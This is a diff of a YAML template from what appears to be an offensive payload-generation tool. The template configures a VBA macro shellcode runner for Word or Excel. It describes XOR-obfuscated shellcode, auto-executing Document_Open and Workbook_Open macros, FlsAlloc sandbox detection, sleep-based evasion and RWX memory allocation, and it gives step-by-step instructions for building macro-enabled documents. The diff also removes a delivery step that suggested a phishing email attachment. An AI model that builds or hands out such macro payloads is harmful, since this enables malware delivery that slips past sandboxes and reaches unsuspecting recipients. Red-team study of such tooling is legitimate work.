@@ -1,8 +1,10 @@
 meta:
-  name: "Simple Shellcode Runner, XOR (VBA)*"
+  name: "Simple Shellcode Runner, XOR (VBA)"
   category: "Shellcode Execution"
   description: |
     Simple shellcode runner in VBA macro with XOR encryption and sandbox evasion.
+
+    WARNING: With my testing it crashed Excel on execution. Use at your own risk!
 
     Features:
     - XOR encryption for basic obfuscation (key: 0xfa/250)
@@ -91,16 +93,15 @@ preprocessing:
     args:
       data: "{{ xor_result.encrypted }}"
       var_name: "buf"
-      bytes_per_line: 15
     output_var: "vba_payload"
 
   # Step 4: Convert hex key to decimal for VBA
   - type: "script"
-    name: "hex_to_decimal"
-    script: "base64_encode.py"
+    name: "convert_hex_to_decimal"
+    script: "hex_to_decimal.py"
     args:
-      data: "{{ xor_key }}"
-    output_var: "xor_key_decimal_temp"
+      hex_value: "{{ xor_key }}"
+    output_var: "xor_key_decimal"
 
 output:
   type: "template"
@@ -116,22 +117,20 @@ output:
 
     # Create Office Document
 
-    {% if office_app == "word" %}1. Create new Word document
+    ## Word
+
+    1. Create new Word document
     2. Alt+F11 (VBA editor)
     3. Insert > Module
     4. Paste contents of {{ output_file }}
-    5. Save as .docm (Macro-Enabled) or .doc (97-2003){% else %}1. Create new Excel workbook
+    5. Save as .docm (Macro-Enabled) or .doc (97-2003)
+
+    ## Excel
+    1. Create new Excel workbook
     2. Alt+F11 (VBA editor)
     3. Insert > Module
     4. Paste contents of {{ output_file }}
-    5. Save as .xlsm (Macro-Enabled) or .xls (97-2003){% endif %}
-
-    # Transfer Document
-
-    ```bash
-    python3 -m http.server 80
-    ```
-    Or via phishing email attachment
+    5. Save as .xlsm (Macro-Enabled) or .xls (97-2003)
 
     # Execute
 
@@ -140,7 +139,7 @@ output:
     # Noteses
 
     - XOR encrypted with key: `0x{{ xor_key }}` (decimal `{{ xor_key_decimal }}`)
-    - Auto-executes via {% if office_app == "word" %}`Document_Open` and `AutoOpen`{% else %}`Workbook_Open` and `Auto_Open`{% endif %} macros
+    - Auto-executes via Auto_Open or Document/Workbook_Open macros
     - FlsAlloc-based sandbox detection (fails on VMs without Fiber Local Storage)
     - 10-second sleep for time-based evasion (sandboxes often skip delays)
     - Uses VirtualAlloc with RWX permissions for shellcode allocation
